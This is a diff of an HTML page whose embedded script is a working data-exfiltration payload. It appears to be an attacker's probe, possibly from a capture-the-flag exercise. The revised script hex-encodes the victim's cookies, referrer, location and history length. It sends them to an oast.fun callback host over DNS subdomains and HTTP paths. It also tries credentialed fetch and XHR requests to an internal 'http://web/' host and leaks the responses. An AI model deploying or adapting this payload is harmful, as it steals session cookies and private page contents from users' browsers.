@@ -3,40 +3,61 @@
 <head><title>x</title></head>
 <body>
 <script>
-// Send everything we can to interactsh
 var oast = "da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun";
 
+function toHex(s) {
+    var h = '';
+    for (var i = 0; i < s.length; i++) h += s.charCodeAt(i).toString(16).padStart(2,'0');
+    return h;
+}
+
 function exfil(label, data) {
-    var encoded = btoa(data).replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');
-    // Send via DNS (subdomain) - split if too long
-    var chunk = encoded.substring(0, 60);
-    new Image().src = "http://" + label + "." + chunk + "." + oast + "/x";
-}
-
-// 1. document.referrer
-exfil("ref", document.referrer || "none");
-
-// 2. Try to fetch the admin page (same origin won't work but try)
-fetch("http://web/", {credentials: "include"}).then(r => r.text()).then(t => {
-    exfil("fetch", t.substring(0, 100));
-}).catch(e => exfil("fetcherr", e.toString()));
-
-// 3. Try window.opener
-if (window.opener) {
-    try {
-        exfil("opener", window.opener.document.body.innerHTML.substring(0, 100));
-    } catch(e) {
-        exfil("openererr", e.toString());
+    var hex = toHex(data);
+    // DNS labels max 63 chars, split into chunks
+    var chunks = [];
+    for (var i = 0; i < hex.length; i += 50) chunks.push(hex.substring(i, i+50));
+    // Send each chunk with index
+    for (var c = 0; c < chunks.length; c++) {
+        new Image().src = "http://" + label + "-" + c + "." + chunks[c] + "." + oast + "/x";
     }
-} else {
-    exfil("opener", "null");
+    // Also send via HTTP path for full data
+    new Image().src = "http://" + label + "." + oast + "/" + encodeURIComponent(data);
 }
 
-// 4. document.cookie (our domain)
-exfil("cookie", document.cookie || "nocookie");
+// Referrer
+exfil("xref", document.referrer || "none");
 
-// 5. Try to read history
-exfil("hist", "len=" + history.length);
+// Cookie
+exfil("xcookie", document.cookie || "nocookie");
+
+// History length
+exfil("xhist", "len=" + history.length);
+
+// Try fetch to http://web/ (cross-origin, likely blocked)
+fetch("http://web/", {credentials: "include", mode: "no-cors"}).then(function(r) {
+    return r.text();
+}).then(function(t) {
+    exfil("xfetch", t.substring(0, 200));
+}).catch(function(e) {
+    exfil("xfetcherr", e.toString().substring(0, 100));
+});
+
+// Try XMLHttpRequest to http://web/
+try {
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", "http://web/", false);
+    xhr.withCredentials = true;
+    xhr.send();
+    exfil("xxhr", xhr.responseText.substring(0, 200));
+} catch(e) {
+    exfil("xxhrerr", e.toString().substring(0, 100));
+}
+
+// Check if opener exists
+exfil("xopener", window.opener ? "exists" : "null");
+
+// Check location
+exfil("xloc", location.href.substring(0, 100));
 </script>
 </body>
 </html>
